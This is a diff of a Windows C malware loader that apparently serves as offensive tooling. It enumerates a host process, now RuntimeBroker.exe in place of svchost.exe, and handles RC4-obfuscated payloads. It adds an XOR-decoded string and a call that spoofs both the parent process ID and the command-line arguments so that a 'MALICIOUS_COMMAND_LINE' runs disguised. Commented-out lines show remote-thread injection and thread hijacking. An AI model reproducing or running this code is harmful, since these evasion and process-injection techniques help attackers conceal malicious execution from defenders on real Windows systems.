@@ -3,13 +3,13 @@ typedef void(WINAPI* pdllMainFunction)();
 int main()
 {
 	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0, hPayloadObjectHandle = 0;
-	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId;
+	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId =0;
 	PUCHAR pObfInput = NULL, * pObfOutput = NULL, pKey = NULL, pExtPayloadAddres = NULL;
 	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
 	Context RC4Context_t;
 	RESOURCE resource;
 	PVOID pExPayload, pStompingTarget = NULL;
-	LPWSTR TargetProcessName = L"svchost.exe";
+	LPWSTR TargetProcessName = L"RuntimeBroker.exe";
 	LPSTR  pTargetProcessName = "RuntimeBroker.exe";
 	//if(!FetchLocalAlertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
 	EnumRemoteProcessHandle(TargetProcessName, &dwPID0, &hProcess);
@@ -114,14 +114,39 @@ int main()
 	//UnmapViewOfFile(pObfInput);
 
 	//HijackThread(hThread, pStompingTarget);
+
 	
-	SpoofParentProcessId2(L"PowerShell.exe Totally Normal & Administratively Command Line Argurmnt", L"powershell.exe -c calc.exe", &hProcess1, &dwPID1 , &dwThreadId);
 
-	hThread1 = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, NULL, NULL, &dwThreadId);
+	BYTE pTargetSubDirectory[9] = {0xC0, 0xA8, 0x01, 0x01, 0x0A, 0x00, 0x00, 0x01, 0x00,};
+	BYTE pXorKey[8] = {0xB3,  0xD1, 0x72, 0x75, 0x6F, 0x6D, 0x33, 0x33};
+	CHAR  pOutput[9] = { '\0' };
 
-	CloseHandle(hProcess);
 
-	if(!hThread1) WaitForSingleObject(hThread1, INFINITE);
+	for (UCHAR i = 0 ; i < 8; i++)
+	{
+		pOutput[i] = pTargetSubDirectory[i] ^ pXorKey[i];
+	}
+
+
+	//SpoofCommandLineArguments(SPOOFED_COMMAND_LINE, MALICIOUS_COMMAND_LINE, sizeof(L"powershell.exe"), &hProcess2, &dwPID2, &hPayloadObjectHandle, &dwThreadId);
+
+	SpoofProcessCLA_PPID(
+		SPOOFED_COMMAND_LINE, 
+		hProcess,
+		MALICIOUS_COMMAND_LINE, 
+		sizeof(L"powershell.exe"),
+		pOutput,
+		&hProcess1, 
+		&dwPID1 ,
+		&hThread,
+		&dwThreadId
+	);
+
+	//hThread1 = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, NULL, NULL, &dwThreadId);
+
+	CloseHandle(hProcess1);
+
+	//if(!hThread1) WaitForSingleObject(hThread1, INFINITE);
 
 	printf("Parent Process PID %lu Child Process PID %lu\n", dwPID0, dwPID1);
 	
